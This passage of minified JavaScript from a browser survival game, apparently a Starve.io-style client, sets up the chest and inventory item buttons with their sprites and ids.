      this.chest_buttons[le.ROOF] = rs(68, 68, 0, sprite[Ie.CHEST_ROOF], 3);
      this.chest_buttons[le.ROOF].id = le.ROOF;
      this.chest_buttons[le.GARLIC_SEED] = rs(68, 68, 0, sprite[Ie.CHEST_GARLIC_SEED], 3);
      this.chest_buttons[le.GARLIC_SEED].id = le.GARLIC_SEED;
      this.chest_buttons[le.GARLIC] = rs(68, 68, 0, sprite[Ie.CHEST_GARLIC], 3);
      this.chest_buttons[le.GARLIC].id = le.GARLIC;
      this.chest_buttons[le.THORNBUSH_SEED] = rs(68, 68, 0, sprite[Ie.CHEST_THORNBUSH_SEED], 3);
      this.chest_buttons[le.THORNBUSH_SEED].id = le.THORNBUSH_SEED;
      this.chest_buttons[le.THORNBUSH] = rs(68, 68, 0, sprite[Ie.CHEST_THORNBUSH], 3);
      this.chest_buttons[le.THORNBUSH].id = le.THORNBUSH;
      this.chest_buttons[le.TOMATO_SEED] = rs(68, 68, 0, sprite[Ie.CHEST_TOMATO_SEED], 3);
      this.chest_buttons[le.TOMATO_SEED].id = le.TOMATO_SEED;
      this.chest_buttons[le.TOMATO] = rs(68, 68, 0, sprite[Ie.CHEST_TOMATO], 3);
      this.chest_buttons[le.TOMATO].id = le.TOMATO;
      this.chest_buttons[le.CARROT_SEED] = rs(68, 68, 0, sprite[Ie.CHEST_CARROT_SEED], 3);
      this.chest_buttons[le.CARROT_SEED].id = le.CARROT_SEED;
      this.chest_buttons[le.CARROT] = rs(68, 68, 0, sprite[Ie.CHEST_CARROT], 3);
      this.chest_buttons[le.CARROT].id = le.CARROT;
      this.chest_buttons[le.WATERMELON_SEED] = rs(68, 68, 0, sprite[Ie.CHEST_WATERMELON_SEED], 3);
      this.chest_buttons[le.WATERMELON_SEED].id = le.WATERMELON_SEED;
      this.chest_buttons[le.WATERMELON] = rs(68, 68, 0, sprite[Ie.CHEST_WATERMELON], 3);
      this.chest_buttons[le.WATERMELON].id = le.WATERMELON;
      this.chest_buttons[le.ALOE_VERA_SEED] = rs(68, 68, 0, sprite[Ie.CHEST_ALOE_VERA_SEED], 3);
      this.chest_buttons[le.ALOE_VERA_SEED].id = le.ALOE_VERA_SEED;
      this.chest_buttons[le.ALOE_VERA] = rs(68, 68, 0, sprite[Ie.CHEST_ALOE_VERA], 3);
      this.chest_buttons[le.ALOE_VERA].id = le.ALOE_VERA;
      this.chest_buttons[le.CHRISTMAS_HAT] = rs(68, 68, 0, sprite[Ie.CHEST_CHRISTMAS_HAT], 3);
      this.chest_buttons[le.CHRISTMAS_HAT].id = le.CHRISTMAS_HAT;
      this.chest_buttons[le.ELF_HAT] = rs(68, 68, 0, sprite[Ie.CHEST_ELF_HAT], 3);
      this.chest_buttons[le.ELF_HAT].id = le.ELF_HAT;
      this.chest_buttons[le.WOOD_SPEAR] = rs(68, 68, 0, sprite[Ie.CHEST_WOOD_SPEAR], 3);
      this.chest_buttons[le.WOOD_SPEAR].id = le.WOOD_SPEAR;
      this.chest_buttons[le.DRAGON_SPEAR] = rs(68, 68, 0, sprite[Ie.CHEST_DRAGON_SPEAR], 3);
      this.chest_buttons[le.DRAGON_SPEAR].id = le.DRAGON_SPEAR;
      this.chest_buttons[le.CRAB_STICK] = rs(68, 68, 0, sprite[Ie.CHEST_CRAB_STICK], 3);
      this.chest_buttons[le.CRAB_STICK].id = le.CRAB_STICK;
      this.chest_buttons[le.CRAB_SPEAR] = rs(68, 68, 0, sprite[Ie.CHEST_CRAB_SPEAR], 3);
      this.chest_buttons[le.CRAB_SPEAR].id = le.CRAB_SPEAR;
      this.chest_buttons[le.CRAB_LOOT] = rs(68, 68, 0, sprite[Ie.CHEST_CRAB_LOOT], 3);
      this.chest_buttons[le.CRAB_LOOT].id = le.CRAB_LOOT;
      this.chest_buttons[le.BED] = rs(68, 68, 0, sprite[Ie.CHEST_BED], 3);
      this.chest_buttons[le.BED].id = le.BED;
      this.chest_buttons[le.CROWN_CRAB] = rs(68, 68, 0, sprite[Ie.CHEST_CROWN_CRAB], 3);
      this.chest_buttons[le.CROWN_CRAB].id = le.CROWN_CRAB;
      this.chest_buttons[le.GARLAND] = rs(68, 68, 0, sprite[Ie.CHEST_GARLAND], 3);
      this.chest_buttons[le.GARLAND].id = le.GARLAND;
      this.chest_buttons[le.SUGAR_CAN] = rs(68, 68, 0, sprite[Ie.CHEST_SUGAR_CAN], 3);
      this.chest_buttons[le.SUGAR_CAN].id = le.SUGAR_CAN;
      this.chest_buttons[le.CANDY] = rs(68, 68, 0, sprite[Ie.CHEST_CANDY], 3);
      this.chest_buttons[le.CANDY].id = le.CANDY;
      this.plus_buttons = [];
      for (o = 0; o < 250; o++) {
        this.plus_buttons[o] = rs(0, 0, 0, sprite[Ie.CHEST_PLUS]);
      }
      this.inv_buttons = [];
      this.inv_buttons[le.SWORD] = rs(60, 60, 0, sprite[Ie.INV_SWORD], 3);
      this.inv_buttons[le.SWORD].id = le.SWORD;
      this.inv_buttons[le.PICK] = rs(60, 60, 0, sprite[Ie.INV_PICK], 3);
      this.inv_buttons[le.PICK].id = le.PICK;
      this.inv_buttons[le.STONE] = rs(60, 60, 0, sprite[Ie.INV_STONE], 3);
      this.inv_buttons[le.STONE].id = le.STONE;
      this.inv_buttons[le.STONE].info.img[2] = this.inv_buttons[le.STONE].info.img[0];
      this.inv_buttons[le.WOOD] = rs(60, 60, 0, sprite[Ie.INV_WOOD], 3);
      this.inv_buttons[le.WOOD].id = le.WOOD;
      this.inv_buttons[le.WOOD].info.img[2] = this.inv_buttons[le.WOOD].info.img[0];
      this.inv_buttons[le.PLANT] = rs(60, 60, 0, sprite[Ie.INV_PLANT], 3);
      this.inv_buttons[le.PLANT].id = le.PLANT;
      this.inv_buttons[le.CACTUS] = rs(60, 60, 0, sprite[Ie.INV_CACTUS], 3);
      this.inv_buttons[le.CACTUS].id = le.CACTUS;
      this.inv_buttons[le.GOLD] = rs(60, 60, 0, sprite[Ie.INV_GOLD], 3);
      this.inv_buttons[le.GOLD].id = le.GOLD;
      this.inv_buttons[le.GOLD].info.img[2] = this.inv_buttons[le.GOLD].info.img[0];
      this.inv_buttons[le.DIAMOND] = rs(60, 60, 0, sprite[Ie.INV_DIAMOND], 3);
      this.inv_buttons[le.DIAMOND].id = le.DIAMOND;
      this.inv_buttons[le.DIAMOND].info.img[2] = this.inv_buttons[le.DIAMOND].info.img[0];
      this.inv_buttons[le.PICK_GOLD] = rs(60, 60, 0, sprite[Ie.INV_PICK_GOLD], 3);
      this.inv_buttons[le.PICK_GOLD].id = le.PICK_GOLD;
      this.inv_buttons[le.PICK_DIAMOND] = rs(60, 60, 0, sprite[Ie.INV_PICK_DIAMOND], 3);
      this.inv_buttons[le.PICK_DIAMOND].id = le.PICK_DIAMOND;
      this.inv_buttons[le.SWORD_GOLD] = rs(60, 60, 0, sprite[Ie.INV_SWORD_GOLD], 3);
      this.inv_buttons[le.SWORD_GOLD].id = le.SWORD_GOLD;
      this.inv_buttons[le.SWORD_WOOD] = rs(60, 60, 0, sprite[Ie.INV_SWORD_WOOD], 3);
      this.inv_buttons[le.SWORD_WOOD].id = le.SWORD_WOOD;
      this.inv_buttons[le.SWORD_DIAMOND] = rs(60, 60, 0, sprite[Ie.INV_SWORD_DIAMOND], 3);
      this.inv_buttons[le.SWORD_DIAMOND].id = le.SWORD_DIAMOND;
      this.inv_buttons[le.FIRE] = rs(60, 60, 0, sprite[Ie.INV_FIRE], 3);
      this.inv_buttons[le.FIRE].id = le.FIRE;
      this.inv_buttons[le.WORKBENCH] = rs(60, 60, 0, sprite[Ie.INV_WORK], 3);
      this.inv_buttons[le.WORKBENCH].id = le.WORKBENCH;
      this.inv_buttons[le.SEED] = rs(60, 60, 0, sprite[Ie.INV_SEED], 3);
      this.inv_buttons[le.SEED].id = le.SEED;
      this.inv_buttons[le.WALL] = rs(60, 60, 0, sprite[Ie.INV_WALL], 3);
      this.inv_buttons[le.WALL].id = le.WALL;
      this.inv_buttons[le.SPIKE] = rs(60, 60, 0, sprite[Ie.INV_SPIKE], 3);
      this.inv_buttons[le.SPIKE].id = le.SPIKE;
      this.inv_buttons[le.PICK_WOOD] = rs(60, 60, 0, sprite[Ie.INV_PICK_WOOD], 3);
      this.inv_buttons[le.PICK_WOOD].id = le.PICK_WOOD;
      this.inv_buttons[le.COOKED_MEAT] = rs(60, 60, 0, sprite[Ie.INV_COOKED_MEAT], 3);
      this.inv_buttons[le.COOKED_MEAT].id = le.COOKED_MEAT;
      this.inv_buttons[le.MEAT] = rs(60, 60, 0, sprite[Ie.INV_MEAT], 3);
      this.inv_buttons[le.MEAT].id = le.MEAT;
      this.inv_buttons[le.BIG_FIRE] = rs(60, 60, 0, sprite[Ie.INV_BIG_FIRE], 3);
      this.inv_buttons[le.BIG_FIRE].id = le.BIG_FIRE;
      this.inv_buttons[le.BANDAGE] = rs(60, 60, 0, sprite[Ie.INV_BANDAGE], 3);
      this.inv_buttons[le.BANDAGE].id = le.BANDAGE;
      this.inv_buttons[le.CORD] = rs(60, 60, 0, sprite[Ie.INV_CORD], 3);
      this.inv_buttons[le.CORD].id = le.CORD;
      this.inv_buttons[le.CORD].info.img[2] = this.inv_buttons[le.CORD].info.img[0];
      this.inv_buttons[le.STONE_WALL] = rs(60, 60, 0, sprite[Ie.INV_STONE_WALL], 3);
      this.inv_buttons[le.STONE_WALL].id = le.STONE_WALL;
      this.inv_buttons[le.GOLD_WALL] = rs(60, 60, 0, sprite[Ie.INV_GOLD_WALL], 3);
      this.inv_buttons[le.GOLD_WALL].id = le.GOLD_WALL;
      this.inv_buttons[le.DIAMOND_WALL] = rs(60, 60, 0, sprite[Ie.INV_DIAMOND_WALL], 3);
      this.inv_buttons[le.DIAMOND_WALL].id = le.DIAMOND_WALL;
      this.inv_buttons[le.WOOD_DOOR] = rs(60, 60, 0, sprite[Ie.INV_DOOR_WOOD_CLOSE], 3);
      this.inv_buttons[le.WOOD_DOOR].id = le.WOOD_DOOR;
      this.inv_buttons[le.CHEST] = rs(60, 60, 0, sprite[Ie.INV_CHEST], 3);
      this.inv_buttons[le.CHEST].id = le.CHEST;
      this.inv_buttons[le.STONE_SPIKE] = rs(60, 60, 0, sprite[Ie.INV_STONE_SPIKE], 3);
      this.inv_buttons[le.STONE_SPIKE].id = le.STONE_SPIKE;
      this.inv_buttons[le.GOLD_SPIKE] = rs(60, 60, 0, sprite[Ie.INV_GOLD_SPIKE], 3);
      this.inv_buttons[le.GOLD_SPIKE].id = le.GOLD_SPIKE;
      this.inv_buttons[le.DIAMOND_SPIKE] = rs(60, 60, 0, sprite[Ie.INV_DIAMOND_SPIKE], 3);
      this.inv_buttons[le.DIAMOND_SPIKE].id = le.DIAMOND_SPIKE;
      this.inv_buttons[le.BAG] = rs(60, 60, 0, sprite[Ie.INV_BAG], 3);
      this.inv_buttons[le.BAG].id = le.BAG;
      this.inv_buttons[le.EARMUFFS] = rs(60, 60, 0, sprite[Ie.INV_EARMUFFS], 3);
      this.inv_buttons[le.EARMUFFS].id = le.EARMUFFS;
      this.inv_buttons[le.STONE_DOOR] = rs(60, 60, 0, sprite[Ie.INV_DOOR_STONE_CLOSE], 3);
      this.inv_buttons[le.STONE_DOOR].id = le.STONE_DOOR;
      this.inv_buttons[le.GOLD_DOOR] = rs(60, 60, 0, sprite[Ie.INV_DOOR_GOLD_CLOSE], 3);
      this.inv_buttons[le.GOLD_DOOR].id = le.GOLD_DOOR;
      this.inv_buttons[le.DIAMOND_DOOR] = rs(60, 60, 0, sprite[Ie.INV_DOOR_DIAMOND_CLOSE], 3);
      this.inv_buttons[le.DIAMOND_DOOR].id = le.DIAMOND_DOOR;
      this.inv_buttons[le.FUR] = rs(60, 60, 0, sprite[Ie.INV_FUR], 3);
      this.inv_buttons[le.FUR].id = le.FUR;
      this.inv_buttons[le.FUR].info.img[2] = this.inv_buttons[le.FUR].info.img[0];
      this.inv_buttons[le.FUR_BOAR] = rs(60, 60, 0, sprite[Ie.INV_FUR_BOAR], 3);
      this.inv_buttons[le.FUR_BOAR].id = le.FUR_BOAR;
      this.inv_buttons[le.FUR_BOAR].info.img[2] = this.inv_buttons[le.FUR_BOAR].info.img[0];
      this.inv_buttons[le.FUR_WOLF] = rs(60, 60, 0, sprite[Ie.INV_FUR_WOLF], 3);
      this.inv_buttons[le.FUR_WOLF].id = le.FUR_WOLF;
      this.inv_buttons[le.FUR_WOLF].info.img[2] = this.inv_buttons[le.FUR_WOLF].info.img[0];
      this.inv_buttons[le.PENGUIN_FEATHER] = rs(60, 60, 0, sprite[Ie.INV_PENGUIN_FEATHER], 3);
      this.inv_buttons[le.PENGUIN_FEATHER].id = le.PENGUIN_FEATHER;
      this.inv_buttons[le.HAWK_FEATHER] = rs(60, 60, 0, sprite[Ie.INV_HAWK_FEATHER], 3);
      this.inv_buttons[le.HAWK_FEATHER].id = le.HAWK_FEATHER;
      this.inv_buttons[le.VULTURE_FEATHER] = rs(60, 60, 0, sprite[Ie.INV_VULTURE_FEATHER], 3);
      this.inv_buttons[le.VULTURE_FEATHER].id = le.VULTURE_FEATHER;
      this.inv_buttons[le.EMERALD] = rs(60, 60, 0, sprite[Ie.INV_EMERALD], 3);
      this.inv_buttons[le.EMERALD].id = le.EMERALD;
      this.inv_buttons[le.EARMUFFS] = rs(60, 60, 0, sprite[Ie.INV_EARMUFFS], 3);
      this.inv_buttons[le.EARMUFFS].id = le.EARMUFFS;
      this.inv_buttons[le.COAT] = rs(60, 60, 0, sprite[Ie.INV_COAT], 3);
      this.inv_buttons[le.COAT].id = le.COAT;
      this.inv_buttons[le.WOOD_SPEAR] = rs(60, 60, 0, sprite[Ie.INV_WOOD_SPEAR], 3);
      this.inv_buttons[le.WOOD_SPEAR].id = le.WOOD_SPEAR;
      this.inv_buttons[le.SPEAR] = rs(60, 60, 0, sprite[Ie.INV_SPEAR], 3);
      this.inv_buttons[le.SPEAR].id = le.SPEAR;
      this.inv_buttons[le.GOLD_SPEAR] = rs(60, 60, 0, sprite[Ie.INV_GOLD_SPEAR], 3);
      this.inv_buttons[le.GOLD_SPEAR].id = le.GOLD_SPEAR;
      this.inv_buttons[le.DIAMOND_SPEAR] = rs(60, 60, 0, sprite[Ie.INV_DIAMOND_SPEAR], 3);
      this.inv_buttons[le.DIAMOND_SPEAR].id = le.DIAMOND_SPEAR;
      this.inv_buttons[le.DRAGON_SPEAR] = rs(60, 60, 0, sprite[Ie.INV_DRAGON_SPEAR], 3);
      this.inv_buttons[le.DRAGON_SPEAR].id = le.DRAGON_SPEAR;
      this.inv_buttons[le.FURNACE] = rs(60, 60, 0, sprite[Ie.INV_FURNACE], 3);
      this.inv_buttons[le.FURNACE].id = le.FURNACE;
      this.inv_buttons[le.EXPLORER_HAT] = rs(60, 60, 0, sprite[Ie.INV_EXPLORER_HAT], 3);
      this.inv_buttons[le.EXPLORER_HAT].id = le.EXPLORER_HAT;
      this.inv_buttons[le.PIRATE_HAT] = rs(60, 60, 0, sprite[Ie.INV_PIRATE_HAT], 3);
      this.inv_buttons[le.PIRATE_HAT].id = le.PIRATE_HAT;
      this.inv_buttons[le.FLOWER_HAT] = rs(60, 60, 0, sprite[Ie.INV_FLOWER_HAT], 3);
      this.inv_buttons[le.FLOWER_HAT].id = le.FLOWER_HAT;
      this.inv_buttons[le.FUR_HAT] = rs(60, 60, 0, sprite[Ie.INV_FUR_HAT], 3);
      this.inv_buttons[le.FUR_HAT].id = le.FUR_HAT;
      this.inv_buttons[le.TURBAN1] = rs(60, 60, 0, sprite[Ie.INV_TURBAN1], 3);
      this.inv_buttons[le.TURBAN1].id = le.TURBAN1;
      this.inv_buttons[le.TURBAN2] = rs(60, 60, 0, sprite[Ie.INV_TURBAN2], 3);
      this.inv_buttons[le.TURBAN2].id = le.TURBAN2;
      this.inv_buttons[le.WOOD_BOW] = rs(60, 60, 0, sprite[Ie.INV_WOOD_BOW], 3);
      this.inv_buttons[le.WOOD_BOW].id = le.WOOD_BOW;
      this.inv_buttons[le.WOOD_ARROW] = rs(60, 60, 0, sprite[Ie.INV_WOOD_ARROW], 3);
      this.inv_buttons[le.WOOD_ARROW].id = le.WOOD_ARROW;
      this.inv_buttons[le.WOOD_SHIELD] = rs(60, 60, 0, sprite[Ie.INV_WOOD_SHIELD], 3);
      this.inv_buttons[le.WOOD_SHIELD].id = le.WOOD_SHIELD;
      this.inv_buttons[le.STONE_BOW] = rs(60, 60, 0, sprite[Ie.INV_STONE_BOW], 3);
      this.inv_buttons[le.STONE_BOW].id = le.STONE_BOW;
      this.inv_buttons[le.STONE_ARROW] = rs(60, 60, 0, sprite[Ie.INV_STONE_ARROW], 3);
      this.inv_buttons[le.STONE_ARROW].id = le.STONE_ARROW;
      this.inv_buttons[le.STONE_SHIELD] = rs(60, 60, 0, sprite[Ie.INV_STONE_SHIELD], 3);
      this.inv_buttons[le.STONE_SHIELD].id = le.STONE_SHIELD;
      this.inv_buttons[le.GOLD_BOW] = rs(60, 60, 0, sprite[Ie.INV_GOLD_BOW], 3);
      this.inv_buttons[le.GOLD_BOW].id = le.GOLD_BOW;
      this.inv_buttons[le.GOLD_ARROW] = rs(60, 60, 0, sprite[Ie.INV_GOLD_ARROW], 3);
      this.inv_buttons[le.GOLD_ARROW].id = le.GOLD_ARROW;
      this.inv_buttons[le.GOLD_SHIELD] = rs(60, 60, 0, sprite[Ie.INV_GOLD_SHIELD], 3);
      this.inv_buttons[le.GOLD_SHIELD].id = le.GOLD_SHIELD;
      this.inv_buttons[le.DIAMOND_BOW] = rs(60, 60, 0, sprite[Ie.INV_DIAMOND_BOW], 3);
      this.inv_buttons[le.DIAMOND_BOW].id = le.DIAMOND_BOW;
      this.inv_buttons[le.DIAMOND_ARROW] = rs(60, 60, 0, sprite[Ie.INV_DIAMOND_ARROW], 3);
      this.inv_buttons[le.DIAMOND_ARROW].id = le.DIAMOND_ARROW;
      this.inv_buttons[le.DIAMOND_SHIELD] = rs(60, 60, 0, sprite[Ie.INV_DIAMOND_SHIELD], 3);
      this.inv_buttons[le.DIAMOND_SHIELD].id = le.DIAMOND_SHIELD;
      this.inv_buttons[le.AMETHYST_BOW] = rs(60, 60, 0, sprite[Ie.INV_AMETHYST_BOW], 3);
      this.inv_buttons[le.AMETHYST_BOW].id = le.AMETHYST_BOW;
      this.inv_buttons[le.AMETHYST_ARROW] = rs(60, 60, 0, sprite[Ie.INV_AMETHYST_ARROW], 3);
      this.inv_buttons[le.AMETHYST_ARROW].id = le.AMETHYST_ARROW;
      this.inv_buttons[le.AMETHYST_SHIELD] = rs(60, 60, 0, sprite[Ie.INV_AMETHYST_SHIELD], 3);
      this.inv_buttons[le.AMETHYST_SHIELD].id = le.AMETHYST_SHIELD;
      this.inv_buttons[le.REIDITE_BOW] = rs(60, 60, 0, sprite[Ie.INV_REIDITE_BOW], 3);
      this.inv_buttons[le.REIDITE_BOW].id = le.REIDITE_BOW;
      this.inv_buttons[le.REIDITE_ARROW] = rs(60, 60, 0, sprite[Ie.INV_REIDITE_ARROW], 3);
      this.inv_buttons[le.REIDITE_ARROW].id = le.REIDITE_ARROW;
      this.inv_buttons[le.REIDITE_SHIELD] = rs(60, 60, 0, sprite[Ie.INV_REIDITE_SHIELD], 3);
      this.inv_buttons[le.REIDITE_SHIELD].id = le.REIDITE_SHIELD;
      this.inv_buttons[le.DRAGON_BOW] = rs(60, 60, 0, sprite[Ie.INV_DRAGON_BOW], 3);
      this.inv_buttons[le.DRAGON_BOW].id = le.DRAGON_BOW;
      this.inv_buttons[le.DRAGON_ARROW] = rs(60, 60, 0, sprite[Ie.INV_DRAGON_ARROW], 3);
      this.inv_buttons[le.DRAGON_ARROW].id = le.DRAGON_ARROW;
      this.inv_buttons[le.WOOD_HELMET] = rs(60, 60, 0, sprite[Ie.INV_WOOD_HELMET], 3);
      this.inv_buttons[le.WOOD_HELMET].id = le.WOOD_HELMET;
      this.inv_buttons[le.STONE_HELMET] = rs(60, 60, 0, sprite[Ie.INV_STONE_HELMET], 3);
      this.inv_buttons[le.STONE_HELMET].id = le.STONE_HELMET;
      this.inv_buttons[le.GOLD_HELMET] = rs(60, 60, 0, sprite[Ie.INV_GOLD_HELMET], 3);
      this.inv_buttons[le.GOLD_HELMET].id = le.GOLD_HELMET;
      this.inv_buttons[le.DIAMOND_HELMET] = rs(60, 60, 0, sprite[Ie.INV_DIAMOND_HELMET], 3);
      this.inv_buttons[le.DIAMOND_HELMET].id = le.DIAMOND_HELMET;
      this.inv_buttons[le.BOOK] = rs(60, 60, 0, sprite[Ie.INV_BOOK], 3);
      this.inv_buttons[le.BOOK].id = le.BOOK;
      this.inv_buttons[le.PAPER] = rs(60, 60, 0, sprite[Ie.INV_PAPER], 3);
      this.inv_buttons[le.PAPER].id = le.PAPER;
      this.inv_buttons[le.PAPER].info.img[2] = this.inv_buttons[le.PAPER].info.img[0];
      this.inv_buttons[le.BAG] = rs(60, 60, 0, sprite[Ie.INV_BAG], 3);
      this.inv_buttons[le.BAG].id = le.BAG;
      this.inv_buttons[le.AMETHYST] = rs(60, 60, 0, sprite[Ie.INV_AMETHYST], 3);
      this.inv_buttons[le.AMETHYST].id = le.AMETHYST;
      this.inv_buttons[le.AMETHYST].info.img[2] = this.inv_buttons[le.AMETHYST].info.img[0];
      this.inv_buttons[le.SWORD_AMETHYST] = rs(60, 60, 0, sprite[Ie.INV_SWORD_AMETHYST], 3);
      this.inv_buttons[le.SWORD_AMETHYST].id = le.SWORD_AMETHYST;
      this.inv_buttons[le.PIRATE_SWORD] = rs(60, 60, 0, sprite[Ie.INV_PIRATE_SWORD], 3);
      this.inv_buttons[le.PIRATE_SWORD].id = le.PIRATE_SWORD;
      this.inv_buttons[le.PICK_AMETHYST] = rs(60, 60, 0, sprite[Ie.INV_PICK_AMETHYST], 3);
      this.inv_buttons[le.PICK_AMETHYST].id = le.PICK_AMETHYST;
      this.inv_buttons[le.PICK_REIDITE] = rs(60, 60, 0, sprite[Ie.INV_PICK_REIDITE], 3);
      this.inv_buttons[le.PICK_REIDITE].id = le.PICK_REIDITE;
      this.inv_buttons[le.AMETHYST_SPEAR] = rs(60, 60, 0, sprite[Ie.INV_AMETHYST_SPEAR], 3);
      this.inv_buttons[le.AMETHYST_SPEAR].id = le.AMETHYST_SPEAR;
      this.inv_buttons[le.HAMMER] = rs(60, 60, 0, sprite[Ie.INV_HAMMER], 3);
      this.inv_buttons[le.HAMMER].id = le.HAMMER;
      this.inv_buttons[le.HAMMER_GOLD] = rs(60, 60, 0, sprite[Ie.INV_HAMMER_GOLD], 3);
      this.inv_buttons[le.HAMMER_GOLD].id = le.HAMMER_GOLD;
      this.inv_buttons[le.HAMMER_DIAMOND] = rs(60, 60, 0, sprite[Ie.INV_HAMMER_DIAMOND], 3);
      this.inv_buttons[le.HAMMER_DIAMOND].id = le.HAMMER_DIAMOND;
      this.inv_buttons[le.HAMMER_AMETHYST] = rs(60, 60, 0, sprite[Ie.INV_HAMMER_AMETHYST], 3);
      this.inv_buttons[le.HAMMER_AMETHYST].id = le.HAMMER_AMETHYST;
      this.inv_buttons[le.HAMMER_REIDITE] = rs(60, 60, 0, sprite[Ie.INV_HAMMER_REIDITE], 3);
      this.inv_buttons[le.HAMMER_REIDITE].id = le.HAMMER_REIDITE;
      this.inv_buttons[le.AMETHYST_WALL] = rs(60, 60, 0, sprite[Ie.INV_AMETHYST_WALL], 3);
      this.inv_buttons[le.AMETHYST_WALL].id = le.AMETHYST_WALL;
      this.inv_buttons[le.AMETHYST_SPIKE] = rs(60, 60, 0, sprite[Ie.INV_AMETHYST_SPIKE], 3);
      this.inv_buttons[le.AMETHYST_SPIKE].id = le.AMETHYST_SPIKE;
      this.inv_buttons[le.AMETHYST_DOOR] = rs(60, 60, 0, sprite[Ie.INV_DOOR_AMETHYST_CLOSE], 3);
      this.inv_buttons[le.AMETHYST_DOOR].id = le.AMETHYST_DOOR;
      this.inv_buttons[le.CAP_SCARF] = rs(60, 60, 0, sprite[Ie.INV_CAP_SCARF], 3);
      this.inv_buttons[le.CAP_SCARF].id = le.CAP_SCARF;
      this.inv_buttons[le.FUR_WINTER] = rs(60, 60, 0, sprite[Ie.INV_FUR_WINTER], 3);
      this.inv_buttons[le.FUR_WINTER].id = le.FUR_WINTER;
      this.inv_buttons[le.FUR_WINTER].info.img[2] = this.inv_buttons[le.FUR_WINTER].info.img[0];
      this.inv_buttons[le.FUR_MAMMOTH] = rs(60, 60, 0, sprite[Ie.INV_FUR_MAMMOTH], 3);
      this.inv_buttons[le.FUR_MAMMOTH].id = le.FUR_MAMMOTH;
      this.inv_buttons[le.FUR_MAMMOTH].info.img[2] = this.inv_buttons[le.FUR_MAMMOTH].info.img[0];
      this.inv_buttons[le.BLUE_CORD] = rs(60, 60, 0, sprite[Ie.INV_BLUE_CORD], 3);
      this.inv_buttons[le.BLUE_CORD].id = le.BLUE_CORD;
      this.inv_buttons[le.BLUE_CORD].info.img[2] = this.inv_buttons[le.BLUE_CORD].info.img[0];
      this.inv_buttons[le.LOCK] = rs(60, 60, 0, sprite[Ie.INV_LOCK], 3);
      this.inv_buttons[le.LOCK].id = le.LOCK;
      this.inv_buttons[le.LOCK].info.img[2] = this.inv_buttons[le.LOCK].info.img[0];
      this.inv_buttons[le.DRAGON_HEART] = rs(60, 60, 0, sprite[Ie.INV_DRAGON_HEART], 3);
      this.inv_buttons[le.DRAGON_HEART].id = le.DRAGON_HEART;
      this.inv_buttons[le.LAVA_HEART] = rs(60, 60, 0, sprite[Ie.INV_LAVA_HEART], 3);
      this.inv_buttons[le.LAVA_HEART].id = le.LAVA_HEART;
      this.inv_buttons[le.RESURRECTION] = rs(60, 60, 0, sprite[Ie.INV_RESURRECTION], 3);
      this.inv_buttons[le.RESURRECTION].id = le.RESURRECTION;
      this.inv_buttons[le.LOCKPICK] = rs(60, 60, 0, sprite[Ie.INV_LOCKPICK], 3);
      this.inv_buttons[le.LOCKPICK].id = le.LOCKPICK;
      this.inv_buttons[le.TOTEM] = rs(60, 60, 0, sprite[Ie.INV_TOTEM], 3);
      this.inv_buttons[le.TOTEM].id = le.TOTEM;
      this.inv_buttons[le.AMETHYST_HELMET] = rs(60, 60, 0, sprite[Ie.INV_AMETHYST_HELMET], 3);
      this.inv_buttons[le.AMETHYST_HELMET].id = le.AMETHYST_HELMET;
      this.inv_buttons[le.SUPER_HAMMER] = rs(60, 60, 0, sprite[Ie.INV_SUPER_HAMMER], 3);
      this.inv_buttons[le.SUPER_HAMMER].id = le.SUPER_HAMMER;
      this.inv_buttons[le.BRIDGE] = rs(60, 60, 0, sprite[Ie.INV_BRIDGE], 3);
      this.inv_buttons[le.BRIDGE].id = le.BRIDGE;
      this.inv_buttons[le.WOOD_TOWER] = rs(60, 60, 0, sprite[Ie.INV_WOOD_TOWER], 3);
      this.inv_buttons[le.WOOD_TOWER].id = le.WOOD_TOWER;
      this.inv_buttons[le.BOAT] = rs(60, 60, 0, sprite[Ie.INV_BOAT], 3);
      this.inv_buttons[le.BOAT].id = le.BOAT;
      this.inv_buttons[le.SLED] = rs(60, 60, 0, sprite[Ie.INV_SLED], 3);
      this.inv_buttons[le.SLED].id = le.SLED;
      this.inv_buttons[le.PLANE] = rs(60, 60, 0, sprite[Ie.INV_PLANE], 3);
      this.inv_buttons[le.PLANE].id = le.PLANE;
      this.inv_buttons[le.SADDLE] = rs(60, 60, 0, sprite[Ie.INV_SADDLE], 3);
      this.inv_buttons[le.SADDLE].id = le.SADDLE;
      this.inv_buttons[le.MOUNT_BOAR] = rs(60, 60, 0, sprite[Ie.INV_MOUNT_BOAR], 3);
      this.inv_buttons[le.MOUNT_BOAR].id = le.MOUNT_BOAR;
      this.inv_buttons[le.CRAB_BOSS] = rs(60, 60, 0, sprite[Ie.INV_CRAB_BOSS], 3);
      this.inv_buttons[le.CRAB_BOSS].id = le.CRAB_BOSS;
      this.inv_buttons[le.BABY_DRAGON] = rs(60, 60, 0, sprite[Ie.INV_BABY_DRAGON], 3);
      this.inv_buttons[le.BABY_DRAGON].id = le.BABY_DRAGON;
      this.inv_buttons[le.BABY_MAMMOTH] = rs(60, 60, 0, sprite[Ie.INV_BABY_MAMMOTH], 3);
      this.inv_buttons[le.BABY_MAMMOTH].id = le.BABY_MAMMOTH;
      this.inv_buttons[le.BABY_LAVA] = rs(60, 60, 0, sprite[Ie.INV_BABY_LAVA], 3);
      this.inv_buttons[le.BABY_LAVA].id = le.BABY_LAVA;
      this.inv_buttons[le.HAWK] = rs(60, 60, 0, sprite[Ie.INV_HAWK], 3);
      this.inv_buttons[le.HAWK].id = le.HAWK;
      this.inv_buttons[le.SAND] = rs(60, 60, 0, sprite[Ie.INV_SAND], 3);
      this.inv_buttons[le.SAND].id = le.SAND;
      this.inv_buttons[le.SAND].info.img[2] = this.inv_buttons[le.SAND].info.img[0];
      this.inv_buttons[le.BOTTLE_FULL] = rs(60, 60, 0, sprite[Ie.INV_BOTTLE_FULL], 3);
      this.inv_buttons[le.BOTTLE_FULL].id = le.BOTTLE_FULL;
      this.inv_buttons[le.BOTTLE_EMPTY] = rs(60, 60, 0, sprite[Ie.INV_BOTTLE_EMPTY], 3);
      this.inv_buttons[le.BOTTLE_EMPTY].id = le.BOTTLE_EMPTY;
      this.inv_buttons[le.SHOVEL] = rs(60, 60, 0, sprite[Ie.INV_SHOVEL], 3);
      this.inv_buttons[le.SHOVEL].id = le.SHOVEL;
      this.inv_buttons[le.SHOVEL_GOLD] = rs(60, 60, 0, sprite[Ie.INV_SHOVEL_GOLD], 3);
      this.inv_buttons[le.SHOVEL_GOLD].id = le.SHOVEL_GOLD;
